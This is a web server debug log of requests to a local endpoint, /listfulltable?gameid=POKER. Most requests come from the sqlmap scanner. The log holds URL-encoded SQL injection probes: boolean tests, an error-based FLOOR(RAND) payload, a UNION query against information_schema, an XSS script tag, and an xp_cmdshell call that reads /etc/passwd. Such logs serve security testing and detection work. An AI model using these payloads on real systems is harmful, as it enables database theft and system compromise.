[D 180302 141157314]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141203098]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER&UvUa%3D5927%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141209890]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141229052]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%29%20AND%20%28SELECT%208783%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716b717871%2C%28SELECT%20%28ELT%288783%3D8783%2C1%29%29%29%2C0x717a717171%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%28%27PNCn%27%3D%27PNCn', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8', 'Accept-Encoding': 'gzip, deflate, br', 'Connection': 'upgrade', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36', 'Host': 'localhost:8008', 'Upgrade-Insecure-Requests': '1'})
[D 180302 141308721]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER.%29%22.%2C%2C%27%2C..', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141314532]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27pROgcH%3C%27%22%3EECbhzr', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141320521]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%29%20AND%209767%3D4361%20AND%20%28%27PIsB%27%3D%27PIsB', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141326292]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%29%20AND%207622%3D7622%20AND%20%28%27nBby%27%3D%27nBby', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141333729]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%20AND%207794%3D5409%20AND%20%27yoUT%27%3D%27yoUT', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141340015]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%20AND%207622%3D7622%20AND%20%27nUJp%27%3D%27nUJp', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141345582]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%25%27%20AND%203285%3D7581%20AND%20%27%25%27%3D%27', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141352560]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%25%27%20AND%207622%3D7622%20AND%20%27%25%27%3D%27', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141358961]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%29%20AND%208388%3D5676%20AND%20%284168%3D4168', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141403938]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%29%20AND%207622%3D7622%20AND%20%284951%3D4951', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141408944]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%20AND%201247%3D9335', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141414452]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%20AND%207622%3D7622', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141420604]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%20AND%202279%3D4818--%20zQPX', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141426874]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%20AND%207622%3D7622--%20eoga', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
